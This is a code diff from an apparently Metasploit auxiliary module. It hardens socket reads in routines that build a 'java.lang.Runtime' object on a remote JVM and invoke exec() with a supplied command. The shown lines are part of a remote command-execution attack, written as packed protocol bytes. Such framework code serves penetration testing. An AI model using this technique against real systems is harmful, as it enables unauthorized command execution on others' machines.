@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("Creating the Java Object 'java.lang.Runtime'")
 		sock.put(java_object)
-		res = sock.get_once()
+		res = sock.get_once() || ''
 		classid = res[5,4]
 
 		runtime =  [0x16000000].pack('V') + classid + [0x0a000000].pack('V')
@@ -65,7 +65,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("Invoking static method 'getRuntime()'")
 		sock.put(runtime)
-		res = sock.get_once()
+		res = sock.get_once() || ''
 		methodid = res[5,4]
 
 		exec =  [0x00].pack('n') + [21 + cmd.length].pack('n') + methodid
@@ -74,7 +74,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("Invoking method 'exec()' with parameter '#{cmd}'")
 		sock.put(exec)
-		success = sock.get_once()
+		success = sock.get_once() || ''
 		if (success =~ /\x00\x00\x00/)
 			print_status("Cleaning up the JVM")
 			rm =  [0x11000000].pack('V') + [0xffffffff].pack('V')
